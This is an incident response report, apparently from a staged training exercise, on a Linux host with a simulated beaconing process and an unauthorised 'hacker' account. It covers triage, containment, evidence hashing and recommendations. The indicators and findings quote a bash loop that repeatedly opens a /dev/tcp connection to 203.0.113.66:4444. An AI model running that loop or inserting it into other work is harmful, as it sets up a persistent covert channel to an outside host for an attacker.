# Incident Response Report

| | |
| --- | --- |
| **Incident ID** | IR-20261127-001 |
| **Date/time detected** | 2026-11-27 01:01:58 +0000 |
| **Analyst** | Irshad Ali |
| **Host** | vm (Ubuntu 24.04.5 LTS, kernel 6.18.44-fc-v880) |
| **Severity** | HIGH (3 high, 1 medium, 1 low findings) |
| **Status** | Contained; evidence preserved |

## Executive summary

A monitoring alert reported unusual outbound traffic from this host. Triage found a detached shell loop writing to a hidden file in `/tmp` and repeatedly trying to connect to 203.0.113.66 on port 4444, and an unrecognised login account `hacker` with a usable password. The process was snapshotted and killed, the IP was blocked in both directions, and the account was locked and expired. Evidence was collected and hashed before the report was written. No data loss has been confirmed; the root cause (how the process and account were created) still needs to be established.

## Indicators of compromise

| Type | Indicator | How it was found |
| --- | --- | --- |
| Process | PID 8999: `bash -c while true; do timeout 120 bash -c 'exec 3<>/dev/tcp/203.0.113.66/4444' 2>/dev/null; sleep 30; done` | Output redirected to a hidden file in /tmp (`/proc/PID/fd`), parent PID 1 |
| Network | Outbound TCP to 203.0.113.66:4444 | The address is hard-coded in the process's command line; no attempt was in flight when `ss` ran |
| Account | `hacker` (no home folder, login shell, password status P) | Not on the list of known accounts; `getent passwd hacker` |
| File | `/tmp/.hidden_log` | Hidden file search in /tmp, /var/tmp, /dev/shm |
| Program hash | `bc5945feb8bd26203ebfafea5ce1878bb2e32cb8fb50ab7ae395cfb1e1aaaef1` (SHA-256 of `/usr/bin/bash`, read through /proc/8999/exe) | Saved before the kill. If it matches the packaged program, the attacker used a tool already on the system (living off the land) |

### All triage findings

**process**

- **HIGH** PID 8999 (root, parent 1) writes its output to hidden file /tmp/.hidden_log: bash -c while true; do timeout 120 bash -c 'exec 3<>/dev/tcp/203.0.113.66/4444' 2>/dev/nul
- **HIGH** PID 8999 (root) has the watchlist IP 203.0.113.66 in its command line

**account**

- **HIGH** unknown login account with a usable password: hacker (UID 30033, shell /bin/bash, password status P), no home folder

**file**

- **MEDIUM** hidden file in a temp folder: /tmp/.hidden_log (root 0 bytes, modified 2026-11-27 01:01:18)
- **LOW** script changed in the last 1d: /etc/profile.d/ccr-agent-proxy-ca.sh

## Containment actions taken

1. Saved a snapshot of PID 8999 (command line, environment, open files, sockets, program hash) to `process_8999_20261127_010215`, then stopped (SIGSTOP) and killed (SIGKILL) it and its children.
2. Blocked 203.0.113.66 with iptables DROP rules inserted at the top of INPUT and OUTPUT, tagged `ir-lab` for exact removal. Rules were saved before and after.
3. Locked (`usermod -L`, `passwd -l`) and expired (`chage -E 0`) the account `hacker`, set its shell to nologin and killed its processes. Expiry matters because a password lock alone does not stop an SSH key login.

### Verification

```text
# Containment verification, 2026-11-27 01:02:18 +0000, host vm

$ ps -p 8999 -o pid,cmd
PID 8999 is a zombie: dead, waiting for its parent to collect it
Process 8999 is no longer running

$ iptables -L -n -v | grep 203.0.113.66
    0     0 DROP       0    --  *      *       203.0.113.66         0.0.0.0/0            /* ir-lab */
    3   180 DROP       0    --  *      *       0.0.0.0/0            203.0.113.66         /* ir-lab */

$ passwd -S hacker
hacker L 2026-11-27 0 99999 7 -1

$ chage -l hacker | grep 'Account expires'
Account expires						: Jan 01, 1970

$ who
```

Both DROP rules are present. After the rules went in, a test connection to 203.0.113.66:4444 was dropped by the OUTPUT rule.

## Evidence collected

| Item | Value |
| --- | --- |
| Archive | `ir_collection_vm_20261127_010223.tar.gz` |
| SHA-256 | `993feef0c5aba60f0a9d2f18e4e410099e6519e24121d65cd08a66679eeb86da` |
| Location | `/var/lib/ir-lab/evidence/` (mode 700, archive mode 400) |
| Integrity check | `collect_evidence.sh --verify <archive>` recomputes the hash and compares it with evidence_hashes.txt |

Chain of custody:

```text
time | action | item | sha256 | by | host
2026-11-27 01:02:24 +0000 | collected | ir_collection_vm_20261127_010223.tar.gz | 993feef0c5aba60f0a9d2f18e4e410099e6519e24121d65cd08a66679eeb86da | root | vm
```

## Timeline of events

All times are local time on the host, from the case timeline written by each script as it ran. Rows marked *simulate* are the staged attacker activity for this exercise.

| Time | Phase | Event |
| --- | --- | --- |
| 2026-11-27 01:01:18 +0000 | simulate | Started simulated suspicious process PID 8999 (bash loop, output to /tmp/.hidden_log, beacons to 203.0.113.66:4444) |
| 2026-11-27 01:01:18 +0000 | simulate | Created simulated unauthorised account hacker (UID 30033) |
| 2026-11-27 01:01:18 +0000 | simulate | Simulated suspicious destination 203.0.113.66:4444 |
| 2026-11-27 01:01:58 +0000 | detect | Triage started (window 1d, watchlist 203.0.113.66) |
| 2026-11-27 01:02:00 +0000 | detect | Triage finished: 3 high, 1 medium, 1 low findings |
| 2026-11-27 01:02:15 +0000 | contain | Containment started (pid=8999 ip=203.0.113.66 user=hacker) |
| 2026-11-27 01:02:15 +0000 | contain | Saved volatile snapshot of PID 8999 to /var/lib/ir-lab/process_8999_20261127_010215 (program SHA-256 bc5945feb8bd26203ebfafea5ce1878bb2e32cb8fb50ab7ae395cfb1e1aaaef1) |
| 2026-11-27 01:02:15 +0000 | contain | Blocked 203.0.113.66 with iptables DROP rules at the top of INPUT and OUTPUT (tag ir-lab) |
| 2026-11-27 01:02:18 +0000 | contain | Verified block: test connection to 203.0.113.66:4444 was dropped by the OUTPUT rule |
| 2026-11-27 01:02:18 +0000 | contain | Killed PID 8999 and the processes below it: 9040 |
| 2026-11-27 01:02:18 +0000 | contain | Locked and expired account hacker, shell set to nologin |
| 2026-11-27 01:02:18 +0000 | contain | Containment verified (result saved to containment_verification.txt) |
| 2026-11-27 01:02:23 +0000 | evidence | Collection ir_collection_vm_20261127_010223 started |
| 2026-11-27 01:02:24 +0000 | evidence | Collected 34 files into ir_collection_vm_20261127_010223.tar.gz, SHA-256 993feef0c5aba60f0a9d2f18e4e410099e6519e24121d65cd08a66679eeb86da |
| 2026-11-27 01:02:24 +0000 | evidence | Verified ir_collection_vm_20261127_010223.tar.gz: hash matches |

## Recommendations

1. Find the entry point: review how `hacker` was created (`useradd` entries in the auth log, the shell history of every administrator) and what started the loop (its parent was PID 1, so it was detached from a shell or service).
2. Rotate credentials for every account that logged in to this host during the window, and review `authorized_keys` for all users.
3. Keep egress filtering: allow outbound traffic only to the destinations the host needs, so a beacon like this one fails by default.
4. Make `/tmp` and `/dev/shm` `noexec,nosuid,nodev` and alert on hidden files there.
5. Ship auth logs and audit events to a central log server so an attacker on the host cannot erase them.
6. Add the program hash and 203.0.113.66 to the blocklist and watchlist used by monitoring.

## Next steps

- [ ] Analyse the process snapshot and any recovered program (malware analysis)
- [ ] Review all firewall rules, not only the two added here
- [ ] Check other hosts for the same indicators (203.0.113.66, account `hacker`, hidden files in /tmp)
- [ ] Move the evidence archive to access-controlled storage and record the transfer in the chain of custody
- [ ] Update the incident response and account-creation policies with what was learned
